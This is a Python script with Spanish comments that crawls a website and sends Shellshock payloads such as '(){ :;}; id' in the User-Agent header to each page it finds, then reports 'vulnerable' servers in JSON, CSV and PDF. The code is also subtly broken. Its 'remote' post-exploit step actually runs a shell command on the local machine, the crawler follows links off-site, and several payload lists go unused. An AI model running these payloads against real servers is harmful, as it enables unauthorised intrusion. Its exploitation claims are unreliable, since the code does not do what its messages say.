import requests
import socket
import time
import os
import subprocess
from urllib.parse import urlparse, urljoin
from threading import Thread
import json
import csv
import pdfkit
from bs4 import BeautifulSoup

# Configuración
TARGET_URL = "http://example.com"  # URL del servidor objetivo
TIMEOUT = 5  # Tiempo de espera para la respuesta
COMMAND_TO_RUN = "echo Vulnerable"  # Comando de prueba para ejecutar
EXPLOIT_PAYLOAD = "(){ :;}; echo Vulnerable"  # Shellshock payload
ADDITIONAL_PAYLOADS = [
    "(){ :;}; id",  # Comando para obtener id de usuario
    "(){ :;}; ls",  # Comando para listar archivos
    "(){ :;}; uname -a"  # Comando para obtener información del sistema
] 
HEADERS = {"User-Agent": "Mozilla/5.0"}
RESULTS_FILE_JSON = "shellshock_results.json"
RESULTS_FILE_CSV = "shellshock_results.csv"
RESULTS_FILE_PDF = "shellshock_results.pdf"
MAX_DEPTH = 3  # Profundidad máxima para rastreo de enlaces

# Función para verificar si el servidor es vulnerable a Shellshock
def check_shellshock_vulnerability(target_url):
    """Realiza una prueba de vulnerabilidad a Shellshock enviando un payload al servidor."""
    try:
        # Enviar un encabezado con el payload de Shellshock
        headers = HEADERS.copy()
        headers["User-Agent"] = EXPLOIT_PAYLOAD
        
        response = requests.get(target_url, headers=headers, timeout=TIMEOUT)
        if "Vulnerable" in response.text:
            return True
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error de conexión: {e}")
    
    return False

# Función para realizar un ataque de Shellshock
def exploit_shellshock(target_url):
    """Realiza un ataque Shellshock enviando un payload malicioso."""
    try:
        # Enviar el payload de Shellshock
        headers = HEADERS.copy()
        headers["User-Agent"] = EXPLOIT_PAYLOAD
        
        response = requests.get(target_url, headers=headers, timeout=TIMEOUT)
        if "Vulnerable" in response.text:
            print(f"[✅] ¡El servidor es vulnerable a Shellshock en {target_url}!")
            print(f"[💥] Comando ejecutado: {COMMAND_TO_RUN}")
            execute_post_exploit(target_url)
        else:
            print(f"[❌] El servidor no es vulnerable a Shellshock en {target_url}.")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error al intentar explotar la vulnerabilidad: {e}")

# Función para ejecutar un comando remoto (explotación real)
def execute_post_exploit(target_url):
    """Ejecuta un comando remoto tras una explotación exitosa de Shellshock."""
    try:
        # Intentar ejecutar un comando remoto a través de un payload
        headers = HEADERS.copy()
        headers["User-Agent"] = EXPLOIT_PAYLOAD
        response = requests.get(target_url, headers=headers, timeout=TIMEOUT)
        
        if "Vulnerable" in response.text:
            print("[✅] Comando ejecutado correctamente: Shellshock exploit exitoso.")
            # Aquí puedes definir comandos adicionales a ejecutar
            response = subprocess.check_output(COMMAND_TO_RUN, shell=True)
            print(f"[🔧] Resultado del comando: {response.decode()}")
        else:
            print("[❌] No se pudo ejecutar el comando: Exploit fallido.")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error al ejecutar el comando remoto: {e}")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Error en la ejecución del comando: {e}")

# Función para obtener la IP del servidor
def get_server_ip(target_url):
    """Obtiene la IP del servidor objetivo a partir de la URL."""
    parsed_url = urlparse(target_url)
    domain = parsed_url.netloc.split(":")[0]
    try:
        ip = socket.gethostbyname(domain)
        return ip
    except socket.gaierror as e:
        print(f"[ERROR] Error al obtener IP del servidor: {e}")
        return None

# Función para generar reportes de los resultados de la prueba
def generate_report(vulnerable_servers):
    """Genera un reporte en JSON, CSV y PDF con los resultados de la prueba."""
    report_data = {
        "vulnerable_servers": vulnerable_servers,
        "timestamp": time.ctime()
    }
    
    # Generación del reporte en JSON
    with open(RESULTS_FILE_JSON, "w") as json_file:
        json.dump(report_data, json_file, indent=4)
    
    # Generación del reporte en CSV
    with open(RESULTS_FILE_CSV, "w", newline="") as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(["URL", "Vulnerabilidad detectada", "Comando ejecutado", "IP del servidor"])
        for server in vulnerable_servers:
            writer.writerow([server["url"], server["vulnerability"], server["command"], server["ip"]])
    
    # Generación del reporte en PDF (usando pdfkit)
    pdf_content = "<h1>Shellshock Exploit Report</h1>"
    pdf_content += f"<p><b>Timestamp:</b> {report_data['timestamp']}</p>"
    pdf_content += "<table><tr><th>URL</th><th>Vulnerabilidad</th><th>Comando ejecutado</th><th>IP del servidor</th></tr>"
    
    for server in vulnerable_servers:
        pdf_content += f"<tr><td>{server['url']}</td><td>{server['vulnerability']}</td><td>{server['command']}</td><td>{server['ip']}</td></tr>"
    
    pdf_content += "</table>"
    pdfkit.from_string(pdf_content, RESULTS_FILE_PDF)
    
    print("[📄] Reportes generados con éxito: JSON, CSV, PDF.")

# Función para rastrear todos los enlaces internos de un sitio web
def crawl_site(url, depth=0, max_depth=MAX_DEPTH):
    """Rastrea un sitio web y explora todas las URLs internas hasta una profundidad máxima."""
    if depth > max_depth:
        return []
    
    # Obtener el contenido de la página
    try:
        response = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Encontrar todas las URLs internas
        internal_urls = set()
        for anchor in soup.find_all('a', href=True):
            link = anchor['href']
            if link.startswith("http"):
                internal_urls.add(link)
            else:
                internal_urls.add(urljoin(url, link))
        
        # Recursión para rastrear los enlaces
        all_urls = list(internal_urls)
        for link in internal_urls:
            all_urls.extend(crawl_site(link, depth+1))
        
        return all_urls
    
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error al rastrear el sitio {url}: {e}")
        return []

# Función para escanear un sitio web completo
def scan_site_for_shellshock(url):
    """Escanea el sitio web completo para detectar vulnerabilidad de Shellshock en cada página."""
    print(f"[🔍] Comenzando el escaneo de {url}")
    urls_to_scan = crawl_site(url)
    print(f"[🔍] Encontradas {len(urls_to_scan)} URLs internas.")
    
    vulnerable_servers = []
    
    for url in urls_to_scan:
        print(f"[🔍] Comprobando vulnerabilidad de Shellshock en: {url}")
        if check_shellshock_vulnerability(url):
            print(f"[✅] Vulnerabilidad detectada en {url}. Intentando explotación...")
            exploit_shellshock(url)
            server_ip = get_server_ip(url)
            vulnerable_servers.append({
                "url": url,
                "vulnerability": "Shellshock",
                "command": COMMAND_TO_RUN,
                "ip": server_ip
            })
        else:
            print(f"[❌] No vulnerable: {url}")
    
    # Generar los reportes
    generate_report(vulnerable_servers)

# Función principal
def main():
    urls_to_scan = [
        "http://example1.com",
        "http://example2.com",
        "http://example3.com"
    ]
    
    # Escanear múltiples URLs
    scan_site_for_shellshock(TARGET_URL)

if __name__ == "__main__":
    main()
